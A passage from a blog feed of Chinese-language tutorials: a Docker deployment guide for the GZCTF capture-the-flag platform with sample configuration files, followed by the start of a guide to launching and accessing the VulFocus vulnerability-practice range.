        <content type="html"><![CDATA[<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10/dist/style.css"><script src="https://fastly.jsdelivr.net/npm/d3@7"></script><script src="https://fastly.jsdelivr.net/npm/markmap-view@0.18.10"></script><script src="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10"></script><link rel="stylesheet" href="/css/markmap.css"><script src="/js/markmap.js"></script>]]></content>
      
      
      <categories>
          
          <category> GZCTF </category>
          
          <category> CTF平台 </category>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 教程 </tag>
            
            <tag> CTF平台 </tag>
            
            <tag> GZCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GZCTF平台搭建(Docker)</title>
      <link href="/post/16d0b8f5/"/>
      <url>/post/16d0b8f5/</url>
      
        <content type="html"><![CDATA[<h1 id="GZCTF平台Docker搭建详细教程"><a href="#GZCTF平台Docker搭建详细教程" class="headerlink" title="GZCTF平台Docker搭建详细教程"></a>GZCTF平台Docker搭建详细教程</h1><h2 id="一、GZCTF平台简介"><a href="#一、GZCTF平台简介" class="headerlink" title="一、GZCTF平台简介"></a>一、GZCTF平台简介</h2><p>GZCTF 是一个基于 ASP.NET Core 的开源 CTF（Capture The Flag）平台，主要面向网络安全竞赛和技能提升。以下是关于 GZCTF 的详细介绍：</p><h3 id="（一）核心功能"><a href="#（一）核心功能" class="headerlink" title="（一）核心功能"></a>（一）核心功能</h3><ul><li><strong>题目类型</strong>：支持多种题目类型，包括静态附件、动态附件、静态容器和动态容器。静态附件是共享的，而动态附件则根据队伍数量进行分发.</li><li><strong>动态分值</strong>：题目分值可以根据解决次数动态调整，支持三血奖励机制.</li><li><strong>实时监控</strong>：基于 SignalR 实现实时比赛通知、比赛事件和 flag 提交监控.</li><li><strong>权限管理</strong>：提供三级用户权限管理，包括管理员、参赛者等.</li><li><strong>Writeup 收集</strong>：支持 Writeup 的收集、查阅和批量下载.</li><li><strong>流量代理</strong>：题目流量可以通过 TCP over WebSocket 代理转发，并支持流量捕获.</li></ul><h3 id="（二）部署方式"><a href="#（二）部署方式" class="headerlink" title="（二）部署方式"></a>（二）部署方式</h3><ul><li><strong>K8s 集群部署</strong>：适用于大型比赛和长期比赛，利用 Kubernetes 的优势进行部署.</li><li><strong>Docker 和 K8s 分离部署</strong>：适用于小型比赛和校赛，部署过程相对简单.</li><li><strong>Docker 单机部署</strong>：适用于单机测试和最小化部署，不适用于生产环境.</li></ul><h3 id="（三）开源协议"><a href="#（三）开源协议" class="headerlink" title="（三）开源协议"></a>（三）开源协议</h3><p>GZCTF 基于 AGPLv3 协议开源，使用和修改均需遵守该协议.</p><h3 id="（四）适用场景"><a href="#（四）适用场景" class="headerlink" title="（四）适用场景"></a>（四）适用场景</h3><ul><li><strong>网络安全初学者</strong>：通过解决实际题目来入门和提高技能.</li><li><strong>教育机构</strong>：可用于教学和实践环节，帮助学生掌握网络安全知识.</li><li><strong>企业培训</strong>：作为内部安全意识培训工具，增强员工的安全防护能力.</li><li><strong>社区活动</strong>：举办线上或线下的 CTF 比赛，促进技术交流与切磋.</li></ul><h2 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h2><h3 id="1-换源"><a href="#1-换源" class="headerlink" title="1. 换源"></a>1. 换源</h3><p>Centos操作系统请参考：<a href="/post/d8c7bf5a/" title="CentOS7换源">[Centos换源]</a><br>Ubuntu操作系统请参考：<a href="/post/e87d94d0/" title="Ubuntu换源">[Ubuntu换源]</a></p><h3 id="2-Docker安装"><a href="#2-Docker安装" class="headerlink" title="2. Docker安装"></a>2. Docker安装</h3><p>你需要安装docker以及docker-compose请参考：<a href="/post/2a40ac23/" title="Docker安装">[Docker安装]</a></p><p><strong>好啦，到此结束，基本工作已经结束，开始开心部署吧【可能会有各种各样的问题，不要着急，最后部署完毕你会开心的】！</strong></p><h2 id="三、GZCTF正式部署"><a href="#三、GZCTF正式部署" class="headerlink" title="三、GZCTF正式部署"></a>三、GZCTF正式部署</h2><blockquote><p>本篇讲述的主要是Docker方式部署</p><blockquote><p>如果你是K8s方式部署，可以参考这篇文章<a href="/post/c8174473/" title="GZCTF平台搭建(仅K8s)">[GZCTF平台仅k8s搭建]</a><br>如果你是Docker+K8s混合方式部署，可以参考这篇文章<a href="/post/4f79e208/" title="GZCTF平台搭建(Docker和K8s)">[GZCTF平台Docker+K8s搭建]</a></p></blockquote></blockquote><h3 id="（一）创建根文件夹GZCTF"><a href="#（一）创建根文件夹GZCTF" class="headerlink" title="（一）创建根文件夹GZCTF"></a>（一）创建根文件夹GZCTF</h3><p>1、创建根文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> GZCTF</span><br></pre></td></tr></table></figure><p>2、进入根文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> GZCTF</span><br></pre></td></tr></table></figure><h3 id="（二）准备信息"><a href="#（二）准备信息" class="headerlink" title="（二）准备信息"></a>（二）准备信息</h3><p>根据官方的文档，在配置<em><strong>appsttings.json</strong></em>和<em><strong>docker-compose.yaml</strong></em>这两个配置文件之前，我们需要准备几个关键的参数信息</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">GZCTF_ADMIN_PASSWORD:</span> <span class="string">Admin123..（GZCTF管理员密码）</span></span><br><span class="line"><span class="attr">POSTGRES_PASSWORD:</span> <span class="string">gzctf123..</span> <span class="string">（数据库密码）</span></span><br><span class="line"><span class="attr">XOR_KEY:</span> <span class="string">thisXorKey</span>  <span class="string">（加密比赛的随机字符串）</span></span><br><span class="line"><span class="attr">PUBLIC_ENTRY:</span> <span class="number">192.168</span><span class="number">.237</span><span class="number">.140</span> <span class="string">（虚拟机ip）</span></span><br></pre></td></tr></table></figure><ul><li><em><strong>GZCTF_ADMIN_PASSWORD</strong></em>：初始管理员密码，在数据库未初始化时生效，需要在第一次启动时进行设置，配置在 <em><strong>docker-compose.yml</strong></em> 中。</li><li><em><strong>POSTGRES_PASSWORD</strong></em>: 数据库密码，需要配置在 <em><strong>docker-compose.yml</strong></em> 中及 <em><strong>appsettings.json</strong></em> 中。</li><li><em><strong>XOR_KEY</strong></em>: 用于加密比赛私钥的随机字符串，需要配置在 <em><strong>appsettings.json</strong></em> 中。</li><li><em><strong>PUBLIC_ENTRY</strong></em>: 外部访问地址，可以是 IP 或域名，需要配置在 <em><strong>appsettings.json</strong></em> 中，用于提供给选手访问题目容器的地址。</li></ul><h3 id="（三）配置文件"><a href="#（三）配置文件" class="headerlink" title="（三）配置文件"></a>（三）配置文件</h3><ol><li><em><strong>appsettings.json</strong></em></li></ol><ul><li>(1)在GZCTF目录中创建 <em><strong>appsettings.json</strong></em> 文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> appsettings.json</span><br></pre></td></tr></table></figure><ul><li>(2)编写并配置 <em><strong>appsettings.json</strong></em> 文件内容</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim appsettings.json</span><br></pre></td></tr></table></figure><p>将以下内容复制并粘贴进入 <em><strong>appsettings.json</strong></em> 文件，并根据你的信息进行修改</p><blockquote><p>“Database”：这条中的Password，需要替换成你的数据库密码<br>“Xorkey”：这条中的XorKey，需要替换成你的XorKey，用于进行flag加密<br>“PublicEntry”：这条中的PublicEntry，需要替换成你的PublicEntry，用于提供给选手访问的IP地址</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;AllowedHosts&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ConnectionStrings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Database&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Host=db:5432;Database=gzctf;Username=postgres;Password=&lt;Your DataBase Passsword&gt;&quot;</span>  <span class="comment">// database password</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;EmailConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;SenderAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;SenderName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Smtp&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;localhost&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span> <span class="number">587</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;XorKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;thisXorKey&quot;</span><span class="punctuation">,</span>   <span class="comment">// XOR key</span></span><br><span class="line">  <span class="attr">&quot;ContainerProvider&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Docker&quot;</span><span class="punctuation">,</span> <span class="comment">// or &quot;Kubernetes&quot;</span></span><br><span class="line">    <span class="attr">&quot;PortMappingType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Default&quot;</span><span class="punctuation">,</span> <span class="comment">// or &quot;PlatformProxy&quot;</span></span><br><span class="line">    <span class="attr">&quot;EnableTrafficCapture&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;PublicEntry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;虚拟IP地址&quot;</span><span class="punctuation">,</span> <span class="comment">// or &quot;xxx.xxx.xxx.xxx&quot;  PublicEntry</span></span><br><span class="line">    <span class="comment">// optional</span></span><br><span class="line">    <span class="attr">&quot;DockerConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;SwarmMode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;unix:///var/run/docker.sock&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;RequestLogging&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;DisableRateLimit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;RegistryConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ServerAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CaptchaConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Provider&quot;</span><span class="punctuation">:</span> <span class="string">&quot;None&quot;</span><span class="punctuation">,</span> <span class="comment">// or &quot;CloudflareTurnstile&quot; or &quot;GoogleRecaptcha&quot;</span></span><br><span class="line">    <span class="attr">&quot;SiteKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;Your SITE_KEY&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;SecretKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;Your SECRET_KEY&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// optional</span></span><br><span class="line">    <span class="attr">&quot;GoogleRecaptcha&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;VerifyAPIAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.recaptcha.net/recaptcha/api/siteverify&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RecaptchaThreshold&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.5&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ForwardedOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;ForwardedHeaders&quot;</span><span class="punctuation">:</span> <span class="number">7</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ForwardLimit&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;TrustedNetworks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;192.168.12.0/8&quot;</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ol start="2"><li><em><strong>docker-compose.yaml</strong></em></li></ol><ul><li>(1)在GZCTF目录中创建 <em><strong>docker-compose.yaml</strong></em> 文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> docker-compose.yaml</span><br></pre></td></tr></table></figure><ul><li>(2)编写并配置 <em><strong>docker-compose.yaml</strong></em> 文件内容</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim docker-compose.yaml</span><br></pre></td></tr></table></figure><p>将以下内容复制并粘贴进入 <em><strong>docker-compose.yaml</strong></em> 文件，并根据你的信息进行修改</p><blockquote><p>‘GZCTF_ADMIN_PASSWORD’：这条中的Admin Password，需要替换成你的GZCTF管理员密码<br>‘POSTGRES_PASSWORD’：这条中的Database Password，需要替换成你的数据库密码<br>‘LC_ALL’：替换为你的语言，比如 <code>LC_ALL=zh_CN.UTF-8</code>（中文），<code>LC_ALL=en_US.UTF-8</code>（英文）<br>‘ports’: 如果运行在本地环境，需要将端口号替换成你的本地端口号，比如 <code>80:8080</code>（本地端口：远程端口）</p><blockquote><p>如果本地端口发生冲突，需要更改本地端口，同时需要在防火墙放行相应的端口出站</p></blockquote></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">gzctf:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">registry.cn-shanghai.aliyuncs.com/gztime/gzctf:develop</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;GZCTF_ADMIN_PASSWORD=&lt;Admin Password&gt;&quot;</span>   <span class="comment"># GZCTF admin password</span></span><br><span class="line">      <span class="comment"># choose your backend language `en_US` / `zh_CN` / `ja_JP`</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;LC_ALL=zh_CN.UTF-8&quot;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:8080&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/files:/app/files&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./appsettings.json:/app/appsettings.json:ro&quot;</span></span><br><span class="line">      <span class="comment"># - &quot;./kube-config.yaml:/app/kube-config.yaml:ro&quot; # this is required for k8s deployment</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;/var/run/docker.sock:/var/run/docker.sock&quot;</span> <span class="comment"># this is required for docker deployment</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres:alpine</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;POSTGRES_PASSWORD=&lt;Your Database Password&gt;&quot;</span>   <span class="comment"># database password</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/db:/var/lib/postgresql/data&quot;</span></span><br></pre></td></tr></table></figure><h3 id="（四）启动项目"><a href="#（四）启动项目" class="headerlink" title="（四）启动项目"></a>（四）启动项目</h3><ol><li>进入GZCTF目录</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> GZCTF</span><br></pre></td></tr></table></figure><ol start="2"><li>查看GZCTF目录下的文件<br>按照以上内容进行操作的话，我们创建并配置了两个文件：<em><strong>appsettings.json</strong></em>，<em><strong>docker-compose.yaml</strong></em>，现在可以启动GZCTF了</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure><ol start="3"><li>启动GZCTF</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose -f docker-compose.yml up -d</span><br></pre></td></tr></table></figure><p>正常的情况，会有一下内容显示【镜像的拉取】，镜像拉取成功后并运行镜像<br><img src="/../../../media/img/essay/GZCTF%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/%E6%AD%A3%E5%B8%B8%E9%95%9C%E5%83%8F%E6%8B%89%E5%8F%96.png" alt="GZCTF镜像拉取"></p><p>如果出现异常的情况，可能：</p><ul><li>网络问题：没有换源，或者是换源失效，导致的镜像拉取超时或者拉取失败</li><li>端口占用：镜像拉取成功后，因为端口占用无法正常启动，导致无法访问</li></ul><p>如果出现了异常问题，请参考这篇文章<a href="/post/7d1cd1d7/" title="GZCTF平台搭建问题合集">[GZCTF平台搭建问题合集]</a></p><p>恭喜啦~！我们已经部署完成啦，接下来我们可以开心的玩耍了，祝你好运！</p><ol start="4"><li>访问GZCTF<br>本地浏览器输入：<em><strong>127.0.0.1:本地端口</strong></em><br>外部访问: <em><strong>虚拟IP地址:远程端口</strong></em></li></ol><p><img src="/../../../media/img/essay/GZCTF%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/GZCTF%E9%A6%96%E9%A1%B5.png" alt="GZCTF界面"></p><ol start="5"><li>登录管理员账户<br>登录管理员账号可以创建比赛、发布题目、进行详细的配置等<br><img src="/../../../media/img/essay/GZCTF%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/%E7%AE%A1%E7%90%86%E5%91%98%E6%8E%A7%E5%88%B6%E9%A1%B5%E9%9D%A2.png" alt="GZCTF管理员登录"></li></ol><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10/dist/style.css"><script src="https://fastly.jsdelivr.net/npm/d3@7"></script><script src="https://fastly.jsdelivr.net/npm/markmap-view@0.18.10"></script><script src="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10"></script><link rel="stylesheet" href="/css/markmap.css"><script src="/js/markmap.js"></script>]]></content>
      
      
      <categories>
          
          <category> GZCTF </category>
          
          <category> CTF平台 </category>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 教程 </tag>
            
            <tag> CTF平台 </tag>
            
            <tag> GZCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulFocus靶场访问(虚拟机/物理机)</title>
      <link href="/post/c95f8404/"/>
      <url>/post/c95f8404/</url>
      
        <content type="html"><![CDATA[<h1 id="VulFocus靶场访问-虚拟机-物理机"><a href="#VulFocus靶场访问-虚拟机-物理机" class="headerlink" title="VulFocus靶场访问(虚拟机&#x2F;物理机)"></a>VulFocus靶场访问(虚拟机&#x2F;物理机)</h1><ul><li><p><strong>什么是VulFocus？</strong></p><p>  对于VulFocus还不了解的伙伴，可以详细参考 <a href="/post/735f6e02/" title="VulFocus-CTF平台简介">VulFocus平台简介</a></p></li><li><p><strong>怎么搭建VulFocus靶场?</strong></p><p>  不知道怎么搭建的伙伴，可以详细参考 <a href="/post/a456a6ae/" title="VulFocus-CTF平台搭建">VulFocus平台搭建</a> 来搭建属于你自己的在线CTF练习靶场</p></li><li><p><strong>如何访问VulFocus靶场?</strong></p><p>  对于VulFocus来说，访问靶场的方式有两种，一种是在虚拟机中访问，另一种是直接在本地物理机上访问。下面我将进行详细的介绍~</p></li></ul><h2 id="一、启动环境（虚拟机）"><a href="#一、启动环境（虚拟机）" class="headerlink" title="一、启动环境（虚拟机）"></a>一、启动环境（虚拟机）</h2><h3 id="（一）docker-compose启动"><a href="#（一）docker-compose启动" class="headerlink" title="（一）docker-compose启动"></a>（一）docker-compose启动</h3><ol><li><strong>切换到vulfocus目录</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulfocus靶场安装路径</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>docker-compose启动项目</strong></li></ol><blockquote><p>注意1：docker-compose.yml需要提前进行配置，启动具体配置可以详细参考 <a href="/post/a456a6ae/" title="VulFocus-CTF平台搭建">VulFocus平台搭建</a>  </p></blockquote><blockquote><p>注意2：这个过程可能会比较慢，因为需要拉取docker镜像，这取决于你的网络环境以及docker镜像加速器的配置，如果你的网络环境比较稳定，可以直接运行</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure><h3 id="（二）docker启动"><a href="#（二）docker启动" class="headerlink" title="（二）docker启动"></a>（二）docker启动</h3><ol><li><strong>切换到vulfocus目录</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulfocus靶场安装路径</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>docker启动项目</strong><blockquote><p>注意：docker启动具体参数介绍可以详细参考<a href="/post/a456a6ae/" title="VulFocus-CTF平台搭建">VulFocus平台搭建</a></p></blockquote></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=本机IP地址 vulfocus/vulfocus</span><br></pre></td></tr></table></figure><p>这里我们使用的是80端口，如何80端口被占用，可以替换成其他的端口启动。<br>如果一定要80端口，需要<em><strong>先查看服务</strong></em>，看是哪一个服务占用80端口，如果是非必要端口，可以直接Kill掉该服务，然后再重新运行该命令启动VulFocus。</p><p><em><strong>查看端口占用，获取PID</strong></em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulnp | grep 需要查看的端口号</span><br></pre></td></tr></table></figure><p><img src="/../../media/img/essay/VulFocus%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/%E6%9F%A5%E7%9C%8B%E6%8C%87%E5%AE%9A%E7%AB%AF%E5%8F%A3%E5%8D%A0%E7%94%A8%E6%83%85%E5%86%B5.png" alt="查看指定端口占用情况"></p><p><img src="/../../media/img/essay/VulFocus%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/%E6%9F%A5%E7%9C%8B%E6%8C%87%E5%AE%9A%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1PID.png" alt="查看指定端口服务PID"></p><p><em><strong>Kill端口占用服务</strong></em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> &lt;PID&gt;</span><br></pre></td></tr></table></figure><h2 id="二、-查看docker镜像状态"><a href="#二、-查看docker镜像状态" class="headerlink" title="二、 查看docker镜像状态"></a>二、 查看docker镜像状态</h2><ol><li><strong>查看docker镜像状态</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>查看docker镜像信息</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p><img src="/../../media/img/essay/VulFocus%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/%E6%9F%A5%E7%9C%8Bdocker%E9%95%9C%E5%83%8F%E4%BF%A1%E6%81%AF.png" alt="查看docker镜像信息"></p><h2 id="三、访问VulFocus-WEB"><a href="#三、访问VulFocus-WEB" class="headerlink" title="三、访问VulFocus-WEB"></a>三、访问VulFocus-WEB</h2><ol><li><p><em><strong>访问地址</strong></em>为: <a href="http://vul_ip/">http://VUL_IP</a></p></li><li><p><strong>默认账号密码</strong>为: <em><strong>admin&#x2F;admin</strong></em><br><img src="/../../media/img/essay/VulFocus%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/VulFocus-WEB%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2.png" alt="VulFocus-WEB"></p></li></ol><p><img src="/../../media/img/essay/VulFocus%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/VulFocus-WEB%E5%88%9D%E5%A7%8B%E9%A6%96%E9%A1%B5.png" alt="VulFocus-WEB初始首页"></p><ol start="3"><li><strong>修改默认账号密码</strong><br>  系统管理—&gt;用户管理—&gt;编辑用户—&gt;修改密码</li></ol><h2 id="四、下载VulFocus靶场镜像"><a href="#四、下载VulFocus靶场镜像" class="headerlink" title="四、下载VulFocus靶场镜像"></a>四、下载VulFocus靶场镜像</h2><p>VulFocus<strong>集成</strong>了<em><strong>大量的漏洞靶场环境</strong></em>，可以自己按需求进行下载复现练习<br><img src="/../../media/img/essay/VulFocus%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/VulFocus%E9%9D%B6%E5%9C%BA%E9%95%9C%E5%83%8F%E4%B8%8B%E8%BD%BD.png" alt="VulFocus靶场镜像下载"></p><h2 id="五、管理靶场镜像"><a href="#五、管理靶场镜像" class="headerlink" 